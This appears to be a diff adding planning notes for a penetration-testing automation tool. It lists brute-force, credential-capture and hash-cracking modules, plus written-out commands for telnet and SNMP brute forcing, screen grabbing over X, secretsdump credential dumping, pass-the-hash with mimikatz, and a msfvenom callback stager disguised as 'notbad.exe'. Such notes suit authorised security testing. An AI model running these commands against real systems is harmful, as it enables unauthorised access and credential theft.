@@ -1,0 +1,26 @@
+Core Functionality:
+    Save/restore KB
+
+Modules:
+    test passwords for various services
+        tools: hydra
+    attempt to login as creds on windows
+        tools: psexec.py (impacket)
+    run responder/smbrelayx and collect creds
+        tools: responder smbrelayx
+    crack hashes
+        tools: john hashcat
+
+    nmap -p23 --script=telnet-brute [targets]
+
+    nmap -sU -p161 --script=snmp-brute [targets]
+
+    xwd -root -screen -silent -display [target]:0 | xwdtopnm | pnmtopng > [target].png
+
+    secretsdump.py [user]:[password]@[target]
+
+    ./crackmapexec.py [target] -d WORKGROUP -u [user] -H [hash]
+
+    ./crackmapexec.py [target] -d WORKGROUP -u [user] -H [hash] --mimikatz
+
+    msfvenom -p auxiliary/pro/generate_dynamic_stager host=[LOCAL IP] port=[LOCAL PORT] -f exe > notbad.exe
